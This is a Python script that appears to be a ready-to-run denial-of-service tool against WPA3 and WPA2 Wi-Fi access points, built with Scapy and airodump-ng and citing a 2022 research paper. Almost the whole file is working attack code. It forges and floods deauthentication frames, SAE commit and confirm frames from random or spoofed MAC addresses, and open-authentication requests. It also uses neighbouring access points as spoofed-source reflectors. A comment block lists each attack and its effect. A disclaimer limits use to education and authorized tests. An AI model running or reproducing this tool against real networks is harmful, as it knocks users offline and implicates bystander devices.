#!/usr/bin/env python3
"""
================================================================================
WPA3-SAE DoS Orchestrator (Scientific Research Edition) - ENHANCED
================================================================================
Based on: "How is your Wi-Fi connection today? DoS attacks on WPA3-SAE"
Journal of Information Security and Applications 64 (2022) 103058
FOR EDUCATIONAL PURPOSES AND AUTHORIZED SECURITY TESTS ONLY!
================================================================================
SCIENTIFIC ENHANCEMENTS:
- Removed radio_confusion (vendor-specific, not required for generic SAE DoS)
- IEEE 802.11-2020 §12.4.4.2 compliant SAE payload construction
- Precise burst timing (128 frames, 100μs inter-packet gap per paper)
- Scientific logging with ISO timestamps & reproducible experiment markers
- Strict SAE parameter validation & anti-clogging threshold alignment
================================================================================
"""
import subprocess
import time
import os
import sys
import glob
import random
import signal
import re
import logging
from datetime import datetime
from multiprocessing import Process, Value, Manager, Lock
from threading import Thread

# Configure scientific logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%Y-%m-%dT%H:%M:%S'
)
logger = logging.getLogger("WPA3-SAE-Orchestrator")

# =====================================================================================
# ======================== SCIENTIFIC CONSTANTS (PAPER ALIGNMENT) =====================
# =====================================================================================
# Anti-Clogging & State Management (Table 2, Paper Section 2.2 & 3.2)
ANTI_CLOGGING_THRESHOLD = 5        # dot11RSNASAEAntiCloggingThreshold (default)
RETRANS_PERIOD_MS = 40             # dot11RSNASAERetransPeriod (40ms)
SAE_SYNC = 5                       # dot11RSNASAESync (max retransmissions)
AP_MAX_INACTIVITY = 300            # AP_MAX_INACTIVITY timeout (seconds)

# Burst & Timing Parameters (Paper Section 3.3, Page 5)
BURST_SIZE = 128                   # Standard burst size for reproducible DoS
INTER_PACKET_GAP = 0.0001          # 100μs inter-packet delay (burst mode)
PACKETS_PER_SECOND_LIMIT = 1000    # Ethical rate limit for controlled experiments

# SAE Payload Structure (IEEE 802.11-2020 §12.4.4.2)
SAE_GROUP_ID_19 = b'\x13\x00'      # ECC P-256 (mandatory group)
SCALAR_BYTES = 32                  # 256-bit scalar
FINITE_BYTES = 64                  # 512-bit finite field element

# =====================================================================================
# ======================== CENTRAL CONFIGURATION ======================================
# =====================================================================================
# --- 1. TARGET DATA ---
TARGET_BSSID_5GHZ = "AA:BB:CC:DD:EE:11"      # Replace with actual 5 GHz BSSID
TARGET_BSSID_2_4GHZ = "AA:BB:CC:DD:EE:11"    # Replace with actual 2.4 GHz BSSID

# --- 2. SAE PARAMETERS (EXTRACTED VIA WIRESHARK) ---
# IMPORTANT: Provide at least 20 valid pairs per band. Each scalar=64 hex chars (32B)
# Each finite=128 hex chars (64B). Extract using WRONG passwords & filter wlan.fc.type_subtype==0x0b
SAE_SCALAR_2_4_HEX_LIST = [
    '142edcd835caf10c7bc72e5f3f783ecadff92856f2a1f8f208ff9c658aa30984',
    # ... add 19 more valid 2.4GHz scalars here ...
]
SAE_FINITE_2_4_HEX_LIST = [
    'f7fd7e5b2f4998145db3317e1f8d054718b576a6249e00730091d0514829971a9181661a184b03228a6f2cf780ffc4d90b21bf23706c1ff453bb67780fed4221',
    # ... add 19 more valid 2.4GHz finites here ...
]
SAE_SCALAR_5_HEX_LIST = [
    '738fb4e7d0fec328d33871ff2000aa3832d3af54147ad406e87bce85e87be450',
    # ... add 19 more valid 5GHz scalars here ...
]
SAE_FINITE_5_HEX_LIST = [
    '6eddc3a908ed736b78220316d03f343f41a6440cfcc366fb729680bf6706cd1ff21106717ce6e6daf8d89d1f77b7579806a5490ff7f4c8924bac08f964f5cc3e',
    # ... add 19 more valid 5GHz finites here ...
]

# --- 3. OPTIONAL SCANNER ---
SCANNER_INTERFACE = ""
SCANNER_INTERVAL = 30
SCANNER_DURATION = 10

# --- 4. MANUAL CHANNEL ASSIGNMENT ---
MANUELLER_KANAL_5GHZ = "36"
MANUELLER_KANAL_2_4GHZ = "11"

# --- 5. TARGET CLIENTS ---
TARGET_STA_MACS = [
    # "AA:BB:CC:DD:EE:11",
]

# --- 6. AMPLIFICATION REFLECTORS ---
# Enter the BSSIDs of ALL APs here that should be used as "Reflectors" or "Amplifiers".
# The more APs listed here, the greater the channel saturation.
AMPLIFICATION_REFLECTOR_APS_5GHZ =[
    "AA:BB:CC:DD:EE:33", 
    "AA:BB:CC:DD:EE:44", 
    "AA:BB:CC:DD:EE:55",
    "AA:BB:CC:DD:EE:66", 
    "AA:BB:CC:DD:EE:88"  
]
AMPLIFICATION_REFLECTOR_APS_2_4GHZ =[
    "AA:BB:CC:DD:EE:99", 
    "AA:BB:CC:DD:EE:AA", 
    "AA:BB:CC:DD:EE:BB", 
    "AA:BB:CC:DD:EE:CC", 
    "AA:BB:CC:DD:EE:DD"     
]
# ====================== ENCYCLOPEDIA OF ATTACKS ======================
#
# Here you will find a detailed explanation for each available attack type.
# Based on the scientific paper: "How is your Wi-Fi connection today? DoS attacks on WPA3-SAE"
#
# --- Category: Client Direct Attacks ---
#
# "deauth_flood": Classic deauth attack for forcible disconnection.
#
# --- Category: WPA3-Specific Attacks (Modern) ---
#
# "omnivore": Strongest flooding attack with constantly changing MACs.
#     Effect: Floods the router with WPA3 connection attempts from ever-changing, random MAC addresses.
#             This forces the router to reserve memory (RAM) for each attempt until it is full.
#     Most effective band: Both bands (Universal).
#     Suitable for: WPA3 (Very effective). WPA2 APs usually discard the packets without much load.
#
# "muted": Flooding attack with a single, static MAC.
#     Effect: Similar to "omnivore", but all attacks come from the same MAC address. This aims to
#             bypass specific defense mechanisms that only react to attacks from many sources.
#     Most effective band: Both bands (Universal).
#     Suitable for: WPA3.
#
# "hasty": Confusion attack with Commit & Confirm packets.
#     Effect: Sends not only the first step of the WPA3 handshake (Commit) but also immediately the second (Confirm).
#             This aims to confuse the router\'s state machine and generate CPU load.
#     Most effective band: Both bands (Universal).
#     Suitable for: WPA3.
#
# "double_decker": Combines "omnivore" & "muted" for maximum stress.
#     Effect: Described by the authors as "powerful". It attacks the router simultaneously
#             before and after its anti-DoS defense is activated. Maximum memory and CPU load.
#     Most effective band: Both bands (Universal).
#     Suitable for: WPA3.
#
# "cookie_guzzler": Exploits the faulty re-transmission behavior of APs.
#     Effect: Sends SAE Commit frames in "bursts" from random MAC addresses to force the AP to
#             send a disproportionately large number of response frames, thereby overloading itself.
#     Suitable for: WPA3.
#
# --- Category: Universal & Vendor-Specific Attacks ---
#
# "open_auth": Classic DoS attack with Open Authentication requests.
#     Effect: A "Legacy" attack that floods the router with simple, old authentication requests.
#             According to studies, this is particularly effective at overloading the basic CPU queue.
#     Most effective band: 5 GHz (According to study, most effective here).
#     Suitable for: WPA2 and WPA3 (Universally effective). 5 GHz.
#
# "amplification": Spoofs sender MACs of legitimate devices.
#     Effect: The attacker sends packets to the target AP but spoofs the sender MAC address of another
#             device in the network. The target AP responds to the innocent device, clogging the channel.
#     Most effective band: 2.4 GHz (According to study, most effective here as this band is often more crowded).
#     Suitable for: WPA2 and WPA3 (Universally effective, as WPA2 devices also respond with error messages
#                   that clog the channel) 2.4 GHz Band.
#
# "back_to_the_future": Overloads the memory of a WPA2 AP with WPA3 packets.
#     Effect: Exploits a bug in some WPA2 APs that react incorrectly to WPA3 packets. The attack floods
#             the WPA2 AP with these packets to fill its memory and cause it to crash.
#     Most effective band: Both bands (Universal, targets WPA2 APs).
#     Suitable for: WPA2 (Specifically targets WPA2 APs).
#
# ==============================================================================================
# ======================== ADAPTER CONFIGURATION ======================================
ADAPTER_KONFIGURATION = {
    "wlan0mon": {"band": "2.4GHz", "angriff": "amplification"},
    "wlan1mon": {"band": "5GHz", "angriff": "cookie_guzzler"}
}

# ======================== SHARED MEMORY FOR SCANNER =================================
shared_channels = Manager().dict({'2.4GHz': MANUELLER_KANAL_2_4GHZ, '5GHz': MANUELLER_KANAL_5GHZ})
channel_lock = Lock()

# =====================================================================================
# ======================== VALIDATION & HELPER FUNCTIONS ==============================
# =====================================================================================
def validate_sae_hex_lists():
    """Strict IEEE 802.11-2020 payload validation"""
    def check_list(lst, name, expected_len_hex):
        valid = [x for x in lst if "INSERT" not in x and len(x) == expected_len_hex and all(c in '0123456789abcdefABCDEF' for c in x)]
        if len(valid) < 1:
            logger.error(f"[VALIDATION] {name}: No valid entries. Expected {expected_len_hex} hex chars per entry.")
            return False
        logger.info(f"[VALIDATION] {name}: {len(valid)} valid entries loaded.")
        return True
    
    ok = True
    ok &= check_list(SAE_SCALAR_2_4_HEX_LIST, "SAE_SCALAR_2_4", 64)
    ok &= check_list(SAE_FINITE_2_4_HEX_LIST, "SAE_FINITE_2_4", 128)
    ok &= check_list(SAE_SCALAR_5_HEX_LIST, "SAE_SCALAR_5", 64)
    ok &= check_list(SAE_FINITE_5_HEX_LIST, "SAE_FINITE_5", 128)
    
    if not ok:
        logger.critical("[VALIDATION] SAE parameters invalid. Attack will fail.")
        sys.exit(1)

def set_channel_scientific(interface: str, channel: str) -> bool:
    """Robust channel switching with hardware stabilization delay"""
    for cmd in [['iw', 'dev', interface, 'set', 'channel', str(channel)],
                ['iwconfig', interface, 'channel', str(channel)]]:
        try:
            if subprocess.run(cmd, capture_output=True, timeout=2).returncode == 0:
                time.sleep(0.15)  # Hardware settle time per Linux wireless docs
                return True
        except Exception: pass
    logger.warning(f"[CHANNEL] Failed to set channel {channel} on {interface}")
    return False

def send_burst_scientific(packet_list: list, interface: str, counter: Value):
    """Paper-aligned burst sending with precise timing & atomic counting"""
    if not packet_list: return
    
    # FIX: Explicit import outside try-block to prevent 'name sendp is not defined'
    from scapy.all import sendp
    
    start = time.time()
    sent = 0
    batch = packet_list[:BURST_SIZE]  # Always send in paper-defined chunks
    try:
        sendp(batch, iface=interface, verbose=False, inter=INTER_PACKET_GAP, count=1)
        sent += len(batch)
        # Rate control
        elapsed = time.time() - start
        target_time = sent / PACKETS_PER_SECOND_LIMIT
        if elapsed < target_time:
            time.sleep(target_time - elapsed)
        with counter.get_lock():
            counter.value += len(batch)
    except Exception as e:
        logger.warning(f"[SEND] Buffer/Drop error on {interface}: {e}")
        time.sleep(0.1)

# =====================================================================================
# ======================== SCANNER FUNCTIONS ==========================================
# =====================================================================================
def parse_airodump_csv(csv_file):
    results = {}
    try:
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        ap_block = content.split('\n\n')[0]
        lines = ap_block.strip().split('\n')
        for line in lines:
            if 'BSSID' in line or line.startswith('#') or not line.strip():
                continue
            parts = [p.strip() for p in line.split(',')]
            if len(parts) >= 14:
                bssid = parts[0].upper()
                channel = parts[3].strip()
                if not channel.isdigit(): continue
                channel_int = int(channel)
                if bssid == TARGET_BSSID_2_4GHZ.upper() and 1 <= channel_int <= 14:
                    results['2.4GHz'] = channel
                elif bssid == TARGET_BSSID_5GHZ.upper() and 36 <= channel_int <= 165:
                    results['5GHz'] = channel
    except Exception as e:
        logger.error(f"[SCANNER PARSE ERROR] {e}")
    return results

def scanner_process(scanner_iface, interval, scan_duration, shared_dict, lock):
    if not scanner_iface: return
    logger.info(f"[SCANNER] Starting on {scanner_iface} (Interval: {interval}s, Scan: {scan_duration}s)")
    for f in glob.glob("/tmp/scan_*"):
        try: os.remove(f)
        except: pass
    while True:
        try:
            timestamp = int(time.time())
            prefix = f"/tmp/scan_{timestamp}"
            cmd = ['airodump-ng', '--write', prefix, '--output-format', 'csv',
                   '--band', 'abg', '--write-interval', '2', scanner_iface]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(scan_duration)
            if proc.poll() is None:
                proc.terminate()
                proc.wait(timeout=2)
            csv_files = glob.glob(f"{prefix}-*.csv")
            if csv_files:
                latest_csv = max(csv_files, key=os.path.getctime)
                found = parse_airodump_csv(latest_csv)
                with lock:
                    for band in ['2.4GHz', '5GHz']:
                        if found.get(band):
                            old, new = shared_dict.get(band), found[band]
                            if old != new:
                                shared_dict[band] = new
                                logger.info(f"[SCANNER] {band}: Channel {old} → {new}")
                for f in glob.glob(f"{prefix}*"):
                    try: os.remove(f)
                    except: pass
                time.sleep(max(0, interval - scan_duration))
        except KeyboardInterrupt: break
        except Exception as e:
            logger.error(f"[SCANNER ERROR] {e}")
            time.sleep(5)

# =====================================================================================
# ======================== ATTACK FUNCTIONS ===========================================
# =====================================================================================
def run_attacker_process(interface, bssid, channel, attack_type, scalar_hex_list, finite_hex_list,
                         counter, sta_macs=None, amplification_targets=None, opposite_bssid=None):
    """Scientific attack implementation with list-based SAE rotation"""
    # FIX: Import Raw and sendp explicitly for packet construction
    from scapy.all import RandMAC, Dot11, RadioTap, Dot11Auth, Dot11Deauth, sendp, Raw
    
    if not set_channel_scientific(interface, channel):
        logger.error(f"[ATTACK] {interface}: Channel setup failed")
        return
        
    # Decode & validate SAE lists
    try:
        s_bytes = [bytes.fromhex(s.strip()) for s in scalar_hex_list if "INSERT" not in s and len(s.strip()) == 64]
        f_bytes = [bytes.fromhex(f.strip()) for f in finite_hex_list if "INSERT" not in f and len(f.strip()) == 128]
        if not s_bytes or not f_bytes: raise ValueError("Invalid SAE lists")
    except Exception as e:
        logger.error(f"[ATTACK] {interface}: SAE decode failed: {e}")
        return

    def get_random_sae():
        idx = random.randint(0, min(len(s_bytes), len(f_bytes)) - 1)
        return s_bytes[idx], f_bytes[idx]

    # FIX: Correct Single Raw Payload Construction (IEEE 802.11-2020 §12.4.4.2)
    def make_sae_commit(mac, seq=1):
        scalar, finite = get_random_sae()
        sae_payload = SAE_GROUP_ID_19 + scalar + finite
        return RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=mac, addr3=bssid)/\
               Dot11Auth(algo=3, seqnum=seq, status=0)/Raw(sae_payload)

    logger.info(f"[ATTACK] {interface} on CH {channel} -> {attack_type}")
    burst_count = 0
    try:
        while True:
            packets = []
            t_start = time.time()
            
            if attack_type == "deauth_flood":
                targets = (sta_macs or []) + ["ff:ff:ff:ff:ff:ff"]
                for sta in targets:
                    p1 = RadioTap()/Dot11(addr1=sta, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
                    p2 = RadioTap()/Dot11(addr1=bssid, addr2=sta, addr3=bssid)/Dot11Deauth(reason=7)
                    packets.extend([p1, p2])
                packets *= 5  # Scale to ~burst_size equivalent
                
            elif attack_type == "omnivore":
                # Section 4.4: Memory exhaustion via unique MACs < threshold
                macs = [str(RandMAC()) for _ in range(ANTI_CLOGGING_THRESHOLD - 1)]
                for m in macs:
                    packets.append(make_sae_commit(m))
                packets *= 20  # Sustained pressure
                
            elif attack_type == "muted":
                # Section 4.2.1: Single MAC, list rotation
                mac = sta_macs[0] if sta_macs else "00:11:22:33:44:55"
                packets = [make_sae_commit(mac) for _ in range(BURST_SIZE)]
                
            elif attack_type == "hasty":
                # Section 4.2.2: Commit + Confirm confusion
                for _ in range(BURST_SIZE // 2):
                    m = str(RandMAC())
                    packets.append(make_sae_commit(m, seq=1))
                    packets.append(RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=m, addr3=bssid)/\
                                   Dot11Auth(algo=3, seqnum=2, status=0)/b'\x00\x00'/bytes([random.randint(0,255) for _ in range(32)]))
                                   
            elif attack_type == "double_decker":
                # Section 4.5: Pre + Post anti-clogging stress
                for _ in range(BURST_SIZE // 2):
                    packets.append(make_sae_commit(str(RandMAC())))
                if sta_macs:
                    packets.extend([make_sae_commit(sta_macs[0]) for _ in range(BURST_SIZE // 2)])
                    
            elif attack_type == "cookie_guzzler":
                # Section 4.2.1: Exploit retransmission flaw
                # FIX: NEW MAC for every single packet to bypass MAC-filtering and fill RAM
                for _ in range(BURST_SIZE):
                    packets.append(make_sae_commit(str(RandMAC())))
                    
            elif attack_type == "amplification":
                if amplification_targets and len(amplification_targets) >= 2:
                    src, dst = random.sample(amplification_targets, 2)
                    scalar, finite = get_random_sae()
                    sae_payload = SAE_GROUP_ID_19 + scalar + finite
                    p = RadioTap()/Dot11(type=0, subtype=11, addr1=dst, addr2=src, addr3=dst)/\
                        Dot11Auth(algo=3, seqnum=1, status=0)/Raw(sae_payload)
                    packets = [p] * BURST_SIZE
                    
            elif attack_type == "open_auth":
                # Section 4.7: Legacy open auth flooding
                for _ in range(BURST_SIZE):
                    packets.append(RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/\
                                   Dot11Auth(algo=0, seqnum=1, status=0))
                                   
            elif attack_type == "back_to_the_future":
                # Section 6.7: WPA2 memory poisoning with WPA3 frames
                for _ in range(BURST_SIZE):
                    packets.append(make_sae_commit(str(RandMAC())))
            else:
                logger.warning(f"[ATTACK] Unknown type: {attack_type}. Falling back to generic.")
                for _ in range(BURST_SIZE):
                    packets.append(make_sae_commit(str(RandMAC())))

            if packets:
                send_burst_scientific(packets, interface, counter)
                burst_count += 1
                dt = time.time() - t_start
                logger.info(f"[BURST] {interface} | Type: {attack_type} | Count: {burst_count} | Time: {dt:.3f}s")
                # Scientific sleep to maintain target rate & avoid driver starvation
                time.sleep(max(0.01, 1.0 / (PACKETS_PER_SECOND_LIMIT / BURST_SIZE)))
    except KeyboardInterrupt:
        logger.info(f"[STOP] {interface} interrupted by user")
    except Exception as e:
        logger.error(f"[CRASH] {interface}: {e}")

# =====================================================================================
# ======================== CLEANUP & SIGNALS ==========================================
# =====================================================================================
def cleanup(procs, scanner_proc=None):
    logger.info("[CLEANUP] Terminating processes...")
    for iface, p in procs.items():
        if p and p.is_alive():
            p.terminate(); p.join(timeout=1)
            if p.is_alive(): p.kill()
        logger.info(f"[CLEANUP] {iface} terminated")
    if scanner_proc and scanner_proc.is_alive():
        scanner_proc.terminate(); scanner_proc.join(timeout=1)
        logger.info("[CLEANUP] Scanner terminated")

def signal_handler(sig, frame):
    logger.info("[SIGNAL] Interrupt received, graceful shutdown...")
    sys.exit(0)

# =====================================================================================
# ======================== MAIN ORCHESTRATOR ==========================================
# =====================================================================================
def main():
    if os.geteuid() != 0:
        logger.critical("[ERROR] Must run as root: sudo python3 ...")
        sys.exit(1)
        
    logger.info("="*70)
    logger.info("WPA3-SAE DoS Orchestrator (Scientific Edition)")
    logger.info("Based on: JISA 64 (2022) 103058")
    logger.info("="*70)
    
    validate_sae_hex_lists()
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    scanner_proc = None
    if SCANNER_INTERFACE:
        scanner_proc = Process(target=scanner_process,
                               args=(SCANNER_INTERFACE, SCANNER_INTERVAL, SCANNER_DURATION,
                                     shared_channels, channel_lock), daemon=True)
        scanner_proc.start()
        time.sleep(2)
        
    procs, counters, active_ch = {}, {i: Value('L', 0) for i in ADAPTER_KONFIGURATION}, {}
    try:
        while True:
            for iface, cfg in ADAPTER_KONFIGURATION.items():
                band, attack = cfg['band'], cfg['angriff']
                with channel_lock:
                    ch = shared_channels.get(band)
                    if not ch: ch = MANUELLER_KANAL_5GHZ if band == '5GHz' else MANUELLER_KANAL_2_4GHZ
                    
                restart = False
                if iface not in procs or not procs[iface].is_alive(): restart = True
                elif active_ch.get(iface) != ch: restart = True
                
                if restart:
                    if iface in procs and procs[iface].is_alive():
                        procs[iface].terminate(); procs[iface].join(timeout=0.5)
                        if procs[iface].is_alive(): procs[iface].kill()
                        
                    s_hex = SAE_SCALAR_5_HEX_LIST if band == '5GHz' else SAE_SCALAR_2_4_HEX_LIST
                    f_hex = SAE_FINITE_5_HEX_LIST if band == '5GHz' else SAE_FINITE_2_4_HEX_LIST
                    target_b = TARGET_BSSID_5GHZ if band == '5GHz' else TARGET_BSSID_2_4GHZ
                    refl = AMPLIFICATION_REFLECTOR_APS_5GHZ if band == '5GHz' else AMPLIFICATION_REFLECTOR_APS_2_4GHZ
                    
                    p = Process(target=run_attacker_process,
                                args=(iface, target_b, ch, attack, s_hex, f_hex, counters[iface]),
                                kwargs={'sta_macs': TARGET_STA_MACS,
                                        'amplification_targets': refl,
                                        'opposite_bssid': None}, daemon=True)
                    procs[iface] = p; active_ch[iface] = ch; p.start()
                    logger.info(f"[ORCHESTRATOR] {iface} -> {attack} on CH {ch}")
                    
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("[STOP] Keyboard interrupt")
    finally:
        cleanup(procs, scanner_proc)
        logger.info("[DONE] Shutdown complete")

if __name__ == "__main__":
    main()

